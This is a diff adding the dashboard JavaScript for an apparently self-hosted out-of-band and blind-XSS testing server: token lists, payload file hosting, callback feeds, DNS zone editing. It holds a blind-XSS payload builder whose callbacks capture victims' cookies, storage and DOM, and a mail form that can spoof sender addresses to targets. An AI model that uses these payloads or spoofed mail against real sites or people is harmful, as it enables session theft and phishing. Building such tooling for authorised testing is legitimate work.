+  var createBtn = el("button",{class:"primary",text:"Create / host", onclick:async function(){
+    msg.textContent=""; msg.className="ok";
+    if(!pathI.value){ msg.className="err"; msg.textContent="path required"; return; }
+    var res = await uploadRaw(pathI.value, typeI.value, ta.value);
+    if(!res) return;
+    if(res.status===200){ msg.textContent="hosted → "+res.json.url; tabFilesList(body,base); }
+    else { msg.className="err"; msg.textContent="error "+res.status+": "+(res.json.error||""); }
+  }});
+
+  var fileI = el("input",{type:"file"});
+  var uploadBtn = el("button",{text:"Upload file", onclick:async function(){
+    msg.textContent=""; msg.className="ok";
+    var f = fileI.files[0]; if(!f){ msg.className="err"; msg.textContent="pick a file"; return; }
+    var buf = await f.arrayBuffer();
+    var path = "/"+f.name;
+    var res = await uploadRaw(path, f.type||"application/octet-stream", buf);
+    if(!res) return;
+    if(res.status===200){ msg.textContent="hosted → "+res.json.url; tabFilesList(body,base); }
+    else { msg.className="err"; msg.textContent="error "+res.status; }
+  }});
+
+  var form = el("div",{class:"form"},[
+    el("h4",{text:"Host a payload"}),
+    el("div",{class:"hint",text:"served at "+base+"<path> — the target fetches it; every fetch is logged"}),
+    presets,
+    el("div",{class:"grid2"},[
+      field("path", pathI), field("content-type", typeI)]),
+    el("div",{class:"row2",style:"margin-top:8px"},[el("div",{style:"flex:1"},"")]),
+    ta,
+    el("div",{class:"row2"},[createBtn, el("span",{class:"hint",text:"— or —"}),
+      fileI, uploadBtn, msg])
+  ]);
+  body.appendChild(form);
+
+  var listBox = el("div",{id:"fileslist"}); body.appendChild(listBox);
+  tabFilesList(body, base);
+}
+
+function field(label, input){
+  return el("label",null,[el("div",{class:"hint",text:label}), input]);
+}
+
+function isTextType(ct){
+  ct = (ct||"").toLowerCase();
+  return ct.indexOf("text/")===0 || ct==="application/json" ||
+         ct==="application/javascript" || ct==="application/xml" ||
+         ct.indexOf("+xml")>=0 || ct.indexOf("+json")>=0 || ct.indexOf("svg")>=0 ||
+         ct.indexOf("html")>=0 || ct.indexOf("xhtml")>=0;
+}
+
+async function editFile(body, base, f, msg){
+  var pathI=document.getElementById("file-path"), typeI=document.getElementById("file-type"),
+      ta=document.getElementById("file-body");
+  if(!pathI||!typeI||!ta) return;
+  pathI.value=f.path; typeI.value=f.content_type||"application/octet-stream";
+  if(!isTextType(f.content_type)){
+    ta.value="";
+    if(msg){ msg.className="err";
+      msg.textContent="binary file — replace it by uploading a new file to "+f.path; }
+  } else {
+    var r = await fetch("/file?token="+encodeURIComponent(state.sel)+
+                        "&path="+encodeURIComponent(f.path), {credentials:"same-origin"});
+    if (r.status===401){ location="/login"; return; }
+    if (!r.ok){ if(msg){ msg.className="err"; msg.textContent="error "+r.status; } return; }
+    ta.value = await r.text();
+    if(msg){ msg.className="ok"; msg.textContent="editing "+f.path+" — Create / host to save"; }
+  }
+  pathI.scrollIntoView({block:"center"}); pathI.focus();
+}
+
+async function deleteFile(body, base, f, msg){
+  if(!confirm("Delete hosted file "+f.path+"?")) return;
+  var r = await fetch("/files?token="+encodeURIComponent(state.sel)+
+                      "&path="+encodeURIComponent(f.path),
+                      {method:"DELETE", credentials:"same-origin"});
+  if (r.status===401){ location="/login"; return; }
+  if (!r.ok){ if(msg){ msg.className="err"; msg.textContent="delete failed "+r.status; } return; }
+  if(msg){ msg.className="ok"; msg.textContent="deleted "+f.path; }
+  tabFilesList(body, base);
+}
+
+async function tabFilesList(body, base){
+  var box = body.querySelector("#fileslist"); if(!box) return;
+  var d = await api("/files?token="+encodeURIComponent(state.sel)); if(!d) return; clear(box);
+  box.appendChild(el("div",{class:"sect",text:"Hosted files"}));
+  if (!d.files.length){ box.appendChild(el("div",{class:"muted",text:"none yet"})); return; }
+  var msg = el("span",{class:"ok"});
+  var t = table(["path","type","size","url",""]); var tb = t.querySelector("tbody");
+  d.files.forEach(function(f){
+    var url = base + f.path;
+    tb.appendChild(el("tr",null,[
+      el("td",{class:"mono",text:f.path}), el("td",{text:f.content_type||"—"}),
+      el("td",{text:String(f.size)}),
+      el("td",null,[el("a",{href:url,target:"_blank",rel:"noopener noreferrer",text:"open"}),
+        document.createTextNode("  "), copyBtn(url)]),
+      el("td",null,[
+        el("button",{text:"edit",onclick:function(){ editFile(body,base,f,msg); }}),
+        document.createTextNode(" "),
+        el("button",{text:"delete",onclick:function(){ deleteFile(body,base,f,msg); }})])]));
+  });
+  box.appendChild(t);
+  box.appendChild(msg);
+}
+
+function kv(pairs){
+  var g = el("div",{class:"kv"});
+  pairs.forEach(function(p){ if(p[1]==null||p[1]==="") return;
+    g.appendChild(el("div",{class:"k",text:p[0]})); g.appendChild(el("div",{class:"mono",text:String(p[1])})); });
+  return g;
+}
+function pre(obj){ return el("pre",{text: typeof obj==="string"?obj:JSON.stringify(obj,null,2)}); }
+
+// ---- global activity feed (all tokens) ------------------------------------
+var feedKind = "";
+var FEED_KINDS = ["", "dns", "http", "file", "mail", "sent", "xss", "page"];
+async function renderFeed(){
+  state.view = "feed";
+  document.querySelectorAll(".tok").forEach(function(x){ x.classList.remove("active"); });
+  var main = document.getElementById("main"); clear(main);
+  main.appendChild(el("h2",{text:"Activity — all tokens"}));
+
+  var sel = el("select",{style:"max-width:140px"});
+  FEED_KINDS.forEach(function(k){ sel.appendChild(el("option",{value:k,text:k||"all kinds"})); });
+  sel.value = feedKind;
+  var reloadBtn = el("button",{text:"Reload"});
+  main.appendChild(el("div",{class:"row2"},[
+    el("span",{class:"hint",text:"filter:"}), sel, reloadBtn,
+    el("span",{class:"hint",text:"— newest first · click a row to open that token"})]));
+
+  var tbl = table(["time","token","kind","summary","src ip"]);
+  main.appendChild(tbl);
+  var moreBtn = el("button",{text:"Load more"}); moreBtn.hidden = true;
+  main.appendChild(el("div",{class:"row2"},[moreBtn]));
+  var cursor = null;
+
+  async function load(reset){
+    var url = "/feed?limit="+MAIN_PAGE + (sel.value ? "&kind=" + sel.value : "")
+            + ((cursor && !reset) ? "&before=" + cursor : "");
+    var d = await api(url); if (!d) return;
+    var tb = tbl.querySelector("tbody"); if (reset) clear(tb);
+    d.events.forEach(function(e){
+      tb.appendChild(el("tr",{class:"row", onclick:function(){ openEvent(e); }},[
+        el("td",{text:ts(e.ts)}), el("td",{class:"mono",text:e.token}),
+        el("td",{class:"k-"+e.kind,text:e.kind}), el("td",{class:"mono",text:e.summary||""}),
+        el("td",{class:"mono",text:e.src_ip||"—"})]));
+    });
+    if (reset && !d.events.length){
+      tb.appendChild(el("tr",null,[el("td",{colspan:"5",class:"muted",text:"no activity yet"})]));
+    }
+    cursor = d.next_before;
+    moreBtn.hidden = !cursor;
+  }
+  sel.addEventListener("change", function(){ feedKind = sel.value; cursor = null; load(true); });
+  reloadBtn.addEventListener("click", function(){ cursor = null; load(true); });
+  moreBtn.addEventListener("click", function(){ load(false); });
+  await load(true);
+}
+function openEvent(e){
+  var byKind = {dns:"interactions", http:"interactions", file:"interactions",
+                mail:"mail", sent:"mail", xss:"xss", page:"pages"};
+  selectToken(e.token, byKind[e.kind] || "interactions");
+}
+
+// ---- global Emails page (all tokens) --------------------------------------
+async function renderEmails(){
+  state.view = "emails";
+  document.querySelectorAll(".tok").forEach(function(x){ x.classList.remove("active"); });
+  var main = document.getElementById("main"); clear(main);
+  main.appendChild(el("h2",{text:"Emails — all mailboxes"}));
+  main.appendChild(el("div",{class:"hint",text:"catch-all: any <name>@"+state.domain+" is received here (grouped by the name); click a row to read it"}));
+
+  // compose from any address, e.g. bob@OOBDOMAIN
+  var craftedFrom = null, applyFrom = null;
+  if (state.smtpSend){
+    var fromI = el("input",{type:"text",placeholder:"bob",style:"max-width:180px"});
+    var toI = el("input",{type:"text",placeholder:"victim@target.com"});
+    var subI = el("input",{type:"text",placeholder:"subject"});
+    var bodyI = el("textarea",{placeholder:"message…"});
+    var smsg = el("span",{class:"ok"});
+    var fromLine = el("div",{class:"hint"});
+    applyFrom = function(a){ craftedFrom = a || null;
+      clear(fromLine);
+      if (craftedFrom){
+        fromLine.appendChild(document.createTextNode("From override: "));
+        fromLine.appendChild(el("span",{class:"mono",text:craftedFrom}));
+        fromLine.appendChild(document.createTextNode(" "));
+        fromLine.appendChild(el("button",{text:"×",title:"clear override",
+          onclick:function(){ applyFrom(null); }}));
+      }
+    };
+    var sendBtn = el("button",{class:"primary",text:"Send", onclick:async function(){
+      smsg.textContent=""; smsg.className="ok";
+      if(!craftedFrom && !fromI.value.trim()){ smsg.className="err"; smsg.textContent="from required"; return; }
+      if(toI.value.indexOf("@")<0){ smsg.className="err"; smsg.textContent="valid 'to' required"; return; }
+      var payload = craftedFrom ? {from_full:craftedFrom} : {from:fromI.value.trim()};
+      payload.to=toI.value.trim(); payload.subject=subI.value; payload.body=bodyI.value;
+      var r = await postStatus("/send", payload);
+      if(r.status===200 && r.json.result && r.json.result.ok){
+        smsg.textContent="sent from "+r.json.from; toI.value=subI.value=bodyI.value=""; load(true);
+      } else { smsg.className="err";
+        smsg.textContent="failed: "+(((r.json.result||{}).error)||r.text||("error "+r.status)); }
+    }});
+    main.appendChild(el("div",{class:"form"},[
+      el("h4",{text:"Send mail"}),
+      el("div",{class:"row2"},[ el("span",{class:"hint",text:"from"}), fromI,
+        el("span",{class:"hint",text:"@"+state.domain}) ]), fromLine,
+      field("to", toI), el("div",{style:"height:8px"}), field("subject", subI),
+      el("div",{style:"height:8px"}), bodyI, el("div",{class:"row2"},[sendBtn, smsg])
+    ]));
+  } else {
+    main.appendChild(el("div",{class:"hint",
+      text:"Outbound send is off (OOB_SMTP_SEND) — receiving to any <name>@"+state.domain+" still works."}));
+  }
+
+  // crafted victim-embedding catch-addresses (enter a token to correlate, or leave blank)
+  main.appendChild(emailCraftBuilder({ showTokenInput:true, onUseFrom: applyFrom }));
+
+  var tbl = table(["time","mailbox","from","subject"]); main.appendChild(tbl);
+  var moreBtn = el("button",{text:"Load more"}); moreBtn.hidden = true;
+  main.appendChild(el("div",{class:"row2"},[moreBtn]));
+  var cursor = null;
+  async function load(reset){
+    var d = await api("/all/emails?limit="+MAIN_PAGE + ((cursor && !reset) ? "&before="+cursor : "")); if(!d) return;
+    var tb = tbl.querySelector("tbody"); if(reset) clear(tb);
+    d.emails.forEach(function(m){
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(m.ts)}), el("td",{class:"mono",text:m.token}),
+        el("td",{class:"mono",text:m.mail_from||"—"}), el("td",{text:m.subject||"(no subject)"})]);
+      expandMail(tb, tr, m.token, m.id); tb.appendChild(tr);
+    });
+    if(reset && !d.emails.length){ tb.appendChild(el("tr",null,[el("td",{colspan:"4",class:"muted",text:"no mail yet"})])); }
+    cursor = d.next_before; moreBtn.hidden = !cursor;
+  }
+  moreBtn.addEventListener("click", function(){ load(false); });
+  await load(true);
+}
+
+// ---- global Blind-XSS page (all tokens) -----------------------------------
+async function renderBlindXss(){
+  state.view = "xssall";
+  document.querySelectorAll(".tok").forEach(function(x){ x.classList.remove("active"); });
+  var main = document.getElementById("main"); clear(main);
+  main.appendChild(el("h2",{text:"Blind XSS — all labels"}));
+  main.appendChild(el("div",{class:"hint",text:"every blind-XSS callback across labels — click for cookies / storage / screenshot / DOM"}));
+
+  // global payload under ANY label — callbacks to <label>.OOBDOMAIN land here, no register
+  var labelI = el("input",{type:"text",value:"hook",style:"max-width:180px"});
+  var xtagI = el("input",{type:"text",placeholder:"tag (optional)",style:"max-width:180px"});
+  var xout = el("input",{type:"text",readonly:"readonly"});
+  function xbuild(){
+    var lab = (labelI.value.trim()||"hook");
+    var scheme = state.tls ? "https" : "http";
+    var src = scheme+"://"+lab+"."+state.domain+"/c.js"
+            + (xtagI.value.trim() ? "?tag="+encodeURIComponent(xtagI.value.trim()) : "");
+    xout.value = '<script src="'+src+'"></'+'script>';
+  }
+  [labelI,xtagI].forEach(function(i){ i.addEventListener("input", xbuild); }); xbuild();
+  main.appendChild(el("div",{class:"form"},[
+    el("h4",{text:"Blind-XSS payload (any label)"}),
+    el("div",{class:"grid2"},[ field("label", labelI), field("tag (optional)", xtagI) ]),
+    el("div",{class:"hint",text:"callbacks to <label>."+state.domain+" are captured under that label — no registration needed"}),
+    el("div",{class:"row2"},[xout, copyBtn2(xout)])
+  ]));
+
+  var tbl = table(["time","label","tag","origin","src"]); main.appendChild(tbl);
+  var moreBtn = el("button",{text:"Load more"}); moreBtn.hidden = true;
+  main.appendChild(el("div",{class:"row2"},[moreBtn]));
+  var cursor = null;
+  async function load(reset){
+    var d = await api("/all/xss?limit="+MAIN_PAGE + ((cursor && !reset) ? "&before="+cursor : "")); if(!d) return;
+    var tb = tbl.querySelector("tbody"); if(reset) clear(tb);
+    d.reports.forEach(function(x){
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(x.ts)}), el("td",{class:"mono",text:x.token}),
+        el("td",{class:"mono",text:x.tag||"—"}), el("td",{class:"mono",text:x.origin||"—"}),
+        el("td",{class:"mono",text:x.src_ip||"—"})]);
+      expandXss(tb, tr, x.token, x.id); tb.appendChild(tr);
+    });
+    if(reset && !d.reports.length){ tb.appendChild(el("tr",null,[el("td",{colspan:"5",class:"muted",text:"no reports yet"})])); }
+    cursor = d.next_before; moreBtn.hidden = !cursor;
+  }
+  moreBtn.addEventListener("click", function(){ load(false); });
+  await load(true);
+}
+
+// ---- global DNS zone config page ------------------------------------------
+async function renderZone(){
+  state.view = "zone";
+  document.querySelectorAll(".tok").forEach(function(x){ x.classList.remove("active"); });
+  var main = document.getElementById("main"); clear(main);
+  main.appendChild(el("div",{class:"muted",text:"loading…"}));
+  var z = await api("/zone"); if(!z) return; clear(main);
+  var eff = z.effective, def = z.defaults, ov = z.overrides;
+
+  main.appendChild(el("h2",{text:"DNS Zone — "+eff.domain}));
+  main.appendChild(el("div",{class:"hint",
+    text:"Authoritative answers for *."+eff.domain+". Overrides persist and take effect within ~2s. "
+       + "Blank a field to fall back to its env default. NS/SOA changes only alter what this server "
+       + "answers — they do not re-delegate the zone at your registrar."}));
+
+  function zi(key, ph){ var i=el("input",{type:"text",placeholder:String(ph==null?"":ph)});
+    if(ov[key]!=null) i.value = Array.isArray(ov[key])?ov[key].join(", "):String(ov[key]); return i; }
+  var f_ipv4=zi("ipv4",def.ipv4), f_ipv6=zi("ipv6",def.ipv6), f_ttl=zi("ttl",def.ttl),
+      f_ns=zi("ns",(def.ns||[]).join(", ")), f_soa=zi("soa_mail",def.soa_mail),
+      f_mxh=zi("mx_host",def.mx_host), f_mxp=zi("mx_pref",def.mx_pref);
+  var zmsg=el("span",{class:"ok"});
+  var saveBtn=el("button",{class:"primary",text:"Save zone", onclick:async function(){
+    zmsg.textContent=""; zmsg.className="ok";
+    var body={ipv4:f_ipv4.value,ipv6:f_ipv6.value,ttl:f_ttl.value,ns:f_ns.value,
+              soa_mail:f_soa.value,mx_host:f_mxh.value,mx_pref:f_mxp.value};
+    var r=await post("/zone",body); if(!r) return;
+    zmsg.textContent="saved"; renderZone();
+  }});
+  main.appendChild(el("div",{class:"form"},[
+    el("h4",{text:"Zone settings (effective shown as placeholders)"}),
+    el("div",{class:"grid2"},[ field("wildcard A (IPv4)",f_ipv4), field("wildcard AAAA (IPv6)",f_ipv6) ]),
+    el("div",{class:"grid2"},[ field("TTL (s)",f_ttl), field("SOA mail",f_soa) ]),
+    field("nameservers (comma)", f_ns),
+    el("div",{class:"grid2"},[ field("MX host",f_mxh), field("MX preference",f_mxp) ]),
+    el("div",{class:"row2"},[saveBtn, zmsg])
+  ]));
+
+  // custom records
+  var nameI=el("input",{type:"text",placeholder:"@ or sub (relative to "+eff.domain+")"});
+  var typeSel=el("select"); z.record_types.forEach(function(t){ typeSel.appendChild(el("option",{value:t,text:t})); });
+  var valI=el("input",{type:"text",placeholder:"value (IP / host / text / \"0 issue \\\"letsencrypt.org\\\"\")"});
+  var ttlI=el("input",{type:"text",placeholder:"ttl (opt)",style:"max-width:90px"});
+  var prioI=el("input",{type:"text",placeholder:"MX prio",style:"max-width:90px"});
+  var rmsg=el("span",{class:"ok"});
+  var addBtn=el("button",{class:"primary",text:"Add record", onclick:async function(){
+    rmsg.textContent=""; rmsg.className="ok";
+    if(!valI.value.trim()){ rmsg.className="err"; rmsg.textContent="value required"; return; }
+    var r=await postStatus("/zone/records",{name:nameI.value,type:typeSel.value,value:valI.value,
+      ttl:ttlI.value,prio:prioI.value});
+    if(r.status===200){ nameI.value=valI.value=ttlI.value=prioI.value=""; renderZone(); }
+    else { rmsg.className="err"; rmsg.textContent="error "+r.status+": "+(r.json.error||r.text||""); }
+  }});
+  var addForm=el("div",{class:"form"},[
+    el("h4",{text:"Custom records"}),
+    el("div",{class:"row2"},[nameI, typeSel, valI, ttlI, prioI, addBtn, rmsg])
+  ]);
+  main.appendChild(addForm);
+
+  if (z.records.length){
+    var t=table(["name","type","value","ttl","prio",""]); var tb=t.querySelector("tbody");
+    z.records.forEach(function(rec){
+      tb.appendChild(el("tr",null,[
+        el("td",{class:"mono",text:rec.name}), el("td",{text:rec.type}),
+        el("td",{class:"mono",text:rec.value}), el("td",{text:rec.ttl==null?"—":String(rec.ttl)}),
+        el("td",{text:rec.prio==null?"—":String(rec.prio)}),
+        el("td",null,[el("button",{text:"delete",onclick:async function(){
+          await fetch("/zone/records/"+rec.id,{method:"DELETE",credentials:"same-origin"}); renderZone();
+        }})])]));
+    });
+    main.appendChild(t);
+  } else {
+    main.appendChild(el("div",{class:"muted",text:"no custom records — the wildcard answers everything"}));
+  }
+}
+async function postStatus(path, body){
+  var r=await fetch(path,{method:"POST",credentials:"same-origin",
+    headers:{"Content-Type":"application/json"},body:JSON.stringify(body||{})});
+  if(r.status===401){location="/login";return {status:401,json:{}};}
+  var j=await r.json().catch(function(){return {};});
+  return {status:r.status, json:j, text:(j&&j.error)||""};
+}
+
+// ---- events ---------------------------------------------------------------
+document.getElementById("new").addEventListener("click", async function(){
+  var note = prompt("Optional note (injection point / target):","");
+  if (note === null) return;
+  var r = await post("/register", {note: note||null}); if(!r) return;
+  await loadTokens(); selectToken(r.token);
+});
+document.getElementById("refresh").addEventListener("click", function(){
+  loadTokens();
+  if(state.view==="zone") renderZone();
+  else if(state.view==="feed") renderFeed();
+  else if(state.view==="emails") renderEmails();
+  else if(state.view==="xssall") renderBlindXss();
+  else if(state.sel) renderMain();
+});
+document.getElementById("navfeed").addEventListener("click", renderFeed);
+document.getElementById("navmail").addEventListener("click", renderEmails);
+document.getElementById("navxss").addEventListener("click", renderBlindXss);
+document.getElementById("navzone").addEventListener("click", renderZone);
+
+// sidebar search (debounced) + clear button + paginated "load more"
+var _searchTimer = null;
+var _tsearch = document.getElementById("tsearch");
+var _tclear = document.getElementById("tsearchclear");
+_tsearch.addEventListener("input", function(e){
+  var v = e.target.value.trim();
+  _tclear.hidden = !e.target.value;                     // show ✕ when there's any text
+  clearTimeout(_searchTimer);
+  _searchTimer = setTimeout(function(){ sidebar.q = v; sidebar.limit = SIDEBAR_PAGE; loadTokens(); }, 250);
+});
+_tclear.addEventListener("click", function(){
+  clearTimeout(_searchTimer);
+  _tsearch.value = ""; _tclear.hidden = true;
+  sidebar.q = ""; sidebar.limit = SIDEBAR_PAGE; loadTokens(); _tsearch.focus();
+});
+_tsearch.addEventListener("keydown", function(e){ if(e.key==="Escape"){ _tclear.click(); } });
+document.getElementById("tokmore").addEventListener("click", function(){
+  sidebar.limit += SIDEBAR_PAGE; loadTokens(); });
+// Title = home → the global Activity feed (the default landing when no token is selected).
+document.getElementById("home").addEventListener("click", function(){ state.sel = null; renderFeed(); });
+
+// Background refresh: the timer updates ONLY the sidebar token counts. The main panel
+// holds editable forms (compose mail, create/upload file, payload builder, zone editor), so
+// it is NEVER auto-rebuilt — that can't wipe what you're typing. Reload the main view on
+// demand with Refresh, a tab, or selecting a token.
+loadTokens();
+renderFeed();          // land on the global Activity feed on open (no token selected yet)
+setInterval(function(){
+  if (document.visibilityState === "visible") loadTokens();
+}, 15000);
+</script>
+</body>
+</html>
